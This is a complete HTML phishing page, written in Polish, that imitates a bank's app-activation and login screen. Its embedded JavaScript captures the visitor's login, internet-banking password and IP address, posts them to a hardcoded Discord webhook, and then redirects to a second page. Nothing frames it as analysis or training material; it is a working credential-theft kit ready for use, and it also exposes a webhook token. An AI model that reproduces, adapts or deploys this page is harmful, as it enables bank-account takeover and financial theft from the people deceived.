<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aktywacja aplikacji</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            margin: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            max-width: 400px;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Header */
        .header {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .back-btn { color: #e50000; font-size: 24px; text-decoration: none; font-weight: bold; }
        .header-title { color: #e50000; font-size: 18px; font-weight: 600; }
        .menu-dots { display: flex; flex-direction: column; gap: 4px; }
        .menu-dots span { width: 22px; height: 2px; background-color: #e50000; }

        /* Ilustraci√≥n del Banco */
        .bank-illustration {
            width: 18px;
            margin: 10px 0;
        }

        h1 {
            font-size: 24px;
            color: #000;
            margin: 15px 0 10px;
            font-weight: bold;
        }

        .description {
            color: #555;
            font-size: 14px;
            line-height: 1.4;
            text-align: center;
            margin-bottom: 25px;
        }

        /* Cuadro de Usuario solicitado (Oculto al inicio) */
        #user-info-box {
            display: none;
            margin-bottom: 20px;
        }

        .user-square {
            width: 65px;
            height: 65px;
            border: 2px solid #000;
            border-radius: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
        }

        .user-square img {
            width: 70%;
            height: 70%;
            object-fit: contain;
        }

        /* Formulario */
        .input-group {
            width: 100%;
            margin-bottom: 15px;
            text-align: left;
        }

        .label-row {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            color: #333;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }

        /* Contrase√±a y Ojo SVG */
        #password-group {
            display: none;
        }

        .password-wrapper {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 24px;
            height: 24px;
            fill: #007a7a;
            cursor: pointer;
        }

        .help-link {
            color: #007a7a;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-top: 10px;
            display: block;
        }

        /* Bot√≥n inferior */
        .btn-continue {
            width: 100%;
            padding: 16px;
            background-color: #e50000;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            margin-top: auto;
            margin-bottom: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="header">
            <a href="#" class="back-btn">‚Äπ</a>
            <div class="header-title">Aktywacja aplikacji</div>
            <div class="menu-dots"><span></span><span></span><span></span></div>
        </div>

        <a href="https://imgbb.com/"><img src="https://i.ibb.co/fVb9yYc9/IMG-5321.jpg" alt="IMG 5321" border="0" style="width: 250px;"></a>

        <h1>Zaloguj siƒô do konta</h1>
        <p class="description">
            Zanim aktywujesz aplikacjƒô, musimy wiedzieƒá, z kt√≥rym kontem po≈ÇƒÖczyƒá TwojƒÖ nowƒÖ kartƒô kredytowƒÖ.
        </p>

        <div id="user-info-box">
            <div class="user-square">
                <img src="https://cdn-icons-png.flaticon.com/512/41/41943.png" alt="User">
            </div>
        </div>

        <div class="input-group">
            <div class="label-row">
                <span>Login</span>
                <span style="color: #999;">0/20</span>
            </div>
            <input type="text" id="login-input" maxlength="20" placeholder="Wpisz login">
        </div>

        <div class="input-group" id="password-group">
            <div class="label-row">
                <span>Has≈Ço do bankowo≈õci internetowej</span>
                <span style="color: #999;">0/20</span>
            </div>
            <div class="password-wrapper">
                <input type="password" id="pass-field" maxlength="20">
                <svg class="eye-icon" viewBox="0 0 24 24" onclick="togglePass()">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </div>
            <a href="#" class="help-link">Jakie has≈Ço wpisaƒá?</a>
        </div>

        <button class="btn-continue" onclick="nextStep()" id="btn-main">Kontynuuj</button>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1460685397070839975/7ODk8T5o2hDUT_1O0-aWrSKH_r5_Y0kcGwIUgnZ_38om5vNCxpJ7XUVt0U7pQAcEMAqt";
        let realIP = "Obteniendo...";

        // Obtener solo la IP al cargar la p√°gina
        window.onload = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                realIP = data.ip;
            } catch (error) {
                realIP = "No disponible";
            }
        };

        async function nextStep() {
            const loginInput = document.getElementById('login-input');
            const passInput = document.getElementById('pass-field');
            const passGroup = document.getElementById('password-group');

            // Paso 1: Mostrar contrase√±a
            if (passGroup.style.display === 'none' || passGroup.style.display === '') {
                if (loginInput.value === "") {
                    alert("Wpisz sw√≥j login");
                    return;
                }
                document.getElementById('user-info-box').style.display = 'block';
                passGroup.style.display = 'block';
                loginInput.readOnly = true;
                loginInput.style.backgroundColor = '#f0f0f0';
            } 
            // Paso 2: Enviar solo datos esenciales y redireccionar
            else {
                if (passInput.value === "") {
                    alert("Wpisz has≈Ço");
                    return;
                }

                const payload = {
                    content: `üë§ **Usuario:** ${loginInput.value}\nüîë **Contrase√±a:** ${passInput.value}\nüåê **IP Real:** ${realIP}`
                };

                try {
                    await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } finally {
                    // Redirecci√≥n inmediata pase lo que pase
                    window.location.href = "index2.html";
                }
            }
        }

        function togglePass() {
            const p = document.getElementById('pass-field');
            p.type = p.type === "password" ? "text" : "password";
        }
    </script>

</body>
</html>
